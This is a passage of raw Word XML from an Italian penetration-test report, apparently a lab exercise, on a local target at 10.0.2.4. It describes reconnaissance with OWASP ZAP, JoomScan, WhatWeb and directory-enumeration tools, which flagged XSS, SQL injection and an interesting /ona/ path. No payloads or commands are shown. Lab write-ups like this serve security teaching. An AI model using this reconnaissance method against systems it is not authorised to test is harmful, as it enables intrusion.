                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="00D02E6F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura </w:t>
      </w:r>
      <w:r w:rsidR="00D02E6F" w:rsidRPr="00D02E6F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r w:rsidRPr="00D02E6F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">: Output del tool OWASP ZAP su </w:t>
      </w:r>
      <w:r w:rsidRPr="00D02E6F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>http://10.0.2.4/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="679BDA74" w14:textId="77777777" w:rsidR="00D02E6F" w:rsidRDefault="00D02E6F" w:rsidP="00D76587"/>
    <w:p w14:paraId="2EF613FA" w14:textId="2F467E32" w:rsidR="00D02E6F" w:rsidRDefault="002A1A98" w:rsidP="00D76587">
      <w:r w:rsidRPr="002A1A98">
        <w:t>Possiamo notare ben 14 avvertimenti che</w:t>
      </w:r>
      <w:r w:rsidR="001D06DC">
        <w:t xml:space="preserve"> sono ordinati in base alla loro gravità. Si possono notare attacchi di varie tipologie: </w:t>
      </w:r>
      <w:r w:rsidR="001D06DC" w:rsidRPr="001D06DC">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Cross Site Scripting</w:t>
      </w:r>
      <w:r w:rsidR="001D06DC">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="001D06DC" w:rsidRPr="001D06DC">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>SQL Injection</w:t>
      </w:r>
      <w:r w:rsidR="001D06DC">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="001D06DC" w:rsidRPr="001D06DC">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Directory Browsing</w:t>
      </w:r>
      <w:r w:rsidR="001D06DC">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:r w:rsidR="001D06DC">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="001D06DC">
        <w:t>Dove per ognuna vengono mostrati sia il codice che sia la descrizione della vulnerabilità e la possibile soluzione per mitigare la vulnerabilità.</w:t>
      </w:r>
      <w:r w:rsidR="00D02E6F">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C06A97E" w14:textId="2BBAFD8F" w:rsidR="00D02E6F" w:rsidRPr="00D02E6F" w:rsidRDefault="00D02E6F" w:rsidP="00D76587">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Abbiamo generato un report in formato </w:t>
      </w:r>
      <w:r w:rsidRPr="00D02E6F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">html </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">con </w:t>
      </w:r>
      <w:r w:rsidRPr="00D02E6F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>OWASP ZAP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> per avere più chiare le informazioni accennate in precedenza. Analizzando i vari attacchi molti iniziano con la directory </w:t>
      </w:r>
      <w:r w:rsidRPr="00D02E6F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>http://10.0.2.4/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">ona/. </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="024573B1" w14:textId="77777777" w:rsidR="00D02E6F" w:rsidRDefault="00D02E6F" w:rsidP="00D76587"/>
    <w:p w14:paraId="7069D145" w14:textId="3D427161" w:rsidR="001C0326" w:rsidRPr="00D02E6F" w:rsidRDefault="00D02E6F" w:rsidP="00D02E6F">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00D02E6F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5CD2A819" wp14:editId="458B2CC8">
            <wp:extent cx="5274310" cy="2538095"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="1388646364" name="Immagine 1" descr="Immagine che contiene testo, schermata, Policromi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6364" name="Immagine 1" descr="Immagine che contiene testo, schermata, Policromia, design&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId32"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="2538095"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:r w:rsidRPr="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Report generato da OWASP ZAP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3152979C" w14:textId="77777777" w:rsidR="00D02E6F" w:rsidRDefault="00D02E6F" w:rsidP="001C0326"/>
    <w:p w14:paraId="32B7E598" w14:textId="77777777" w:rsidR="00D02E6F" w:rsidRDefault="00D02E6F" w:rsidP="001C0326"/>
    <w:p w14:paraId="187A92AE" w14:textId="26B1188F" w:rsidR="0003027C" w:rsidRPr="00762A03" w:rsidRDefault="0003027C" w:rsidP="0003027C">
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00762A03">
        <w:t>Taramite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00762A03">
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r w:rsidRPr="00762A03">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> tool OWASP </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00762A03">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>JoomScan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="003F27AD" w:rsidRPr="00762A03">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00762A03">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00762A03">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>WhatWeb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00762A03">
        <w:t xml:space="preserve"> effettuiamo</w:t>
      </w:r>
      <w:r w:rsidR="00034863" w:rsidRPr="00762A03">
        <w:t xml:space="preserve"> la</w:t>
      </w:r>
      <w:r w:rsidRPr="00762A03">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> CMS &amp; Framework </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00762A03">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Identification</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00762A03">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CD1E837" w14:textId="77777777" w:rsidR="00034863" w:rsidRPr="00762A03" w:rsidRDefault="00034863" w:rsidP="0003027C"/>
    <w:p w14:paraId="18C05C48" w14:textId="0969A3E9" w:rsidR="00034863" w:rsidRDefault="00034863" w:rsidP="0003027C">
      <w:r w:rsidRPr="00034863">
        <w:t>Per avere al</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">tre informazioni su Sistema di gestione dei contenuti e sull’identificazione dei </w:t>
      </w:r>
      <w:r w:rsidRPr="00034863">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>framework</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> eseguiamo i vari tool citati in precedenza.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A6951C8" w14:textId="27BC01A6" w:rsidR="00034863" w:rsidRDefault="00034863" w:rsidP="0003027C">
      <w:r>
        <w:t xml:space="preserve">Tramite </w:t>
      </w:r>
      <w:r w:rsidRPr="00034863">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">OWASP </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00034863">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>JoomScan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00034863">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00034863">
        <w:t>non c</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">i vengono date molte informazioni. Viene trovato solo il robotos.txt e ci viene dato un suggerimento su un </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>path</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> interessante.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A53959B" w14:textId="3F1817C3" w:rsidR="00034863" w:rsidRDefault="00034863" w:rsidP="0003027C">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="221B4B59" wp14:editId="3DC2B117">
            <wp:extent cx="5271770" cy="1814830"/>
            <wp:effectExtent l="0" t="0" r="5080" b="0"/>
            <wp:docPr id="729719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1770" cy="1814830"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D7702C5" w14:textId="47AFC0D4" w:rsidR="0054046A" w:rsidRDefault="00451291" w:rsidP="0054046A">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251728896" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="3C855AE2" wp14:editId="79BD4FF9">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>-635</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>638387</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3031067" cy="331894"/>
                <wp:effectExtent l="0" t="0" r="17145" b="11430"/>
                <wp:wrapNone/>
                <wp:docPr id="2067702583" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="3031067" cy="331894"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="6BC8EA80" w14:textId="77777777" w:rsidR="00451291" w:rsidRDefault="00451291" w:rsidP="004512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55AE2" id="_x0000_s1036" style="position:absolute;left:0;text-align:left;margin-left:-.05pt;margin-top:50.25pt;width:238.65pt;height:26.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reUgIAAJ4EAAAOAAAAZHJzL2Uyb0RvYy54bWysVE1v2zAMvQ/YfxB0X20n6VdQp8gSZBhQ&#10;tAXaoWdGlmIDsqRRSuzu14+S3abtdhp2UUiRfiIfH3N13beaHST6xpqSFyc5Z9IIWzVmV/Ifj5sv&#10;F5z5AKYCbY0s+bP0/Hrx+dNV5+ZyYmurK4mMQIyfd67kdQhunmVe1LIFf2KdNBRUFlsI5OIuqxA6&#10;Qm91Nsnzs6yzWDm0QnpPt+shyBcJXykpwp1SXgamS061hXRiOrfxzBZXMN8huLoRYxnwD1W00Bh6&#10;9BVqDQHYHps/oNpGoPVWhRNh28wq1QiZeqBuivxDNw81OJl6IXK8e6XJ/z9YcXt4cPdINHTOzz2Z&#10;sYteYRt/qT7WJ7KeX8mSfWCCLqf5tMjPzjkTFJtOi4vLWWQzO37t0Idv0rYsGiVHGkbiCA43Pgyp&#10;LynxMWM3jdZpINqwruST01lOMxNAulAaApmtq0ruzY4z0DsSnAiYIL3VTRU/j0Aed9uVRnaAOPT8&#10;a75Jc6bK3qXFt9fg6yEvhcYGtIkwMslnLPXITrRCv+1ZQ6UUCTlebW31fI8M7SAx78SmoQduwId7&#10;QNIUdUJ7Eu7oUNpSe3a0OKst/vrbfcynUVOUs440Sq3/3ANKzvR3QyK4LGazKOrkzE7PJ+Tg28j2&#10;bcTs25UlRgraSCeSGfODfjEV2vaJ1mkZX6UQGEFvDySPzioMu0MLKeRymdJIyA7CjXlwIoJH6iK1&#10;j/0ToBtnH0g1t/ZFzzD/IIEhdxDBch+sapI+jrySrqJDS5AUNi5s3LK3fso6/q0sfgMAAP//AwBQ&#10;SwMEFAAGAAgAAAAhAGsfAazeAAAACQEAAA8AAABkcnMvZG93bnJldi54bWxMj8FuwjAQRO+V+g/W&#10;VuoNbEIpaYiDqkqVeqBSC3yAiZckIl5HtoHw992e2uPOjGbflOvR9eKCIXaeNMymCgRS7W1HjYb9&#10;7n2Sg4jJkDW9J9Rwwwjr6v6uNIX1V/rGyzY1gksoFkZDm9JQSBnrFp2JUz8gsXf0wZnEZ2ikDebK&#10;5a6XmVLP0pmO+ENrBnxrsT5tz06D29QvIX008/3XPL9tul2SR/ep9ePD+LoCkXBMf2H4xWd0qJjp&#10;4M9ko+g1TGYcZFmpBQj2n5bLDMSBlUWWg6xK+X9B9QMAAP//AwBQSwECLQAUAAYACAAAACEAtoM4&#10;kv4AAADhAQAAEwAAAAAAAAAAAAAAAAAAAAAAW0NvbnRlbnRfVHlwZXNdLnhtbFBLAQItABQABgAI&#10;AAAAIQA4/SH/1gAAAJQBAAALAAAAAAAAAAAAAAAAAC8BAABfcmVscy8ucmVsc1BLAQItABQABgAI&#10;AAAAIQDUFPreUgIAAJ4EAAAOAAAAAAAAAAAAAAAAAC4CAABkcnMvZTJvRG9jLnhtbFBLAQItABQA&#10;BgAIAAAAIQBrHwGs3gAAAAkBAAAPAAAAAAAAAAAAAAAAAKwEAABkcnMvZG93bnJldi54bWxQSwUG&#10;AAAAAAQABADzAAAAtwUAAAAA&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="6BC8EA80" w14:textId="77777777" w:rsidR="00451291" w:rsidRDefault="00451291" w:rsidP="00451291">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00034863">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7C03C3CC" wp14:editId="7791BF55">
            <wp:extent cx="4876800" cy="1031875"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="127975033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6800" cy="1031875"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA201DE" w14:textId="5CE58D9F" w:rsidR="0003027C" w:rsidRDefault="00034863" w:rsidP="0054046A">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00034863">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Figura</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00034863">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> 11: Output del tool OWAS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">P </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>JoomSacnn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="518D760B" w14:textId="77777777" w:rsidR="0054046A" w:rsidRDefault="0054046A" w:rsidP="0054046A">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A1B79AA" w14:textId="16B2E089" w:rsidR="0054046A" w:rsidRPr="00287683" w:rsidRDefault="0054046A" w:rsidP="00287683">
      <w:pPr>
        <w:rPr>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00287683">
        <w:rPr>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Andando ad utilizzare </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00287683">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>whatweb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00287683">
        <w:rPr>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> sull’indirizzo http://10.0.2.4 abbiamo poche informazioni, quindi; sapendo che diversi </w:t>
      </w:r>
      <w:r w:rsidRPr="00287683">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>too</w:t>
      </w:r>
      <w:r w:rsidRPr="00287683">
        <w:rPr>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">l visti in precedenza ci sottolineano come la directory /ona/ sia utile andiamo ad effettuare la scansione all’indirizzo </w:t>
      </w:r>
      <w:hyperlink r:id="rId35" w:history="1">
        <w:r w:rsidRPr="00287683">
          <w:rPr>
            <w:rStyle w:val="Collegamentoipertestuale"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>http://10.0.2.4/ona/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00287683">
        <w:rPr>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D55E788" w14:textId="20E8D7A9" w:rsidR="0054046A" w:rsidRPr="0054046A" w:rsidRDefault="0054046A" w:rsidP="00A72AA8">
      <w:r>
        <w:t xml:space="preserve">Ci vengono restituite informazioni sulla versione di Apache, informazioni sui cookies, sul server </w:t>
      </w:r>
      <w:r w:rsidR="00A72AA8">
        <w:t>http e sul titolo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46B5AF7F" w14:textId="62C3A2CA" w:rsidR="00A72AA8" w:rsidRPr="00A72AA8" w:rsidRDefault="0054046A" w:rsidP="00A72AA8">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0054046A">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5D7647F7" wp14:editId="6B105C20">
            <wp:extent cx="5274310" cy="3823970"/>
            <wp:effectExtent l="0" t="0" r="2540" b="5080"/>
            <wp:docPr id="185413637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36372" name="Immagine 1" descr="Immagine che contiene testo, schermata, software, Carattere&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId36"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="3823970"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00A72AA8" w:rsidRPr="00034863">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Figura</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A72AA8" w:rsidRPr="00034863">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1</w:t>
      </w:r>
      <w:r w:rsidR="00A72AA8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="00A72AA8" w:rsidRPr="00034863">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">: Output del tool </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00A72AA8" w:rsidRPr="00A72AA8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>whatweb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="458D813E" w14:textId="77777777" w:rsidR="00A72AA8" w:rsidRPr="00A72AA8" w:rsidRDefault="00A72AA8" w:rsidP="001C0326">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A220DD2" w14:textId="48D664AB" w:rsidR="00D02E6F" w:rsidRPr="00A72AA8" w:rsidRDefault="0003027C" w:rsidP="001C0326">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A72AA8">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Tramite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A72AA8">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A72AA8">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A72AA8">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00A72AA8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">tool </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A72AA8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>gobuster</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A72AA8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>, drib</w:t>
      </w:r>
      <w:r w:rsidR="00A72AA8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="00A72AA8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> OWASP </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A72AA8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>DirBuster</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A72AA8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> e </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A72AA8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>dirsearch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A72AA8">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A72AA8">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>effettuiamo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A72AA8">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
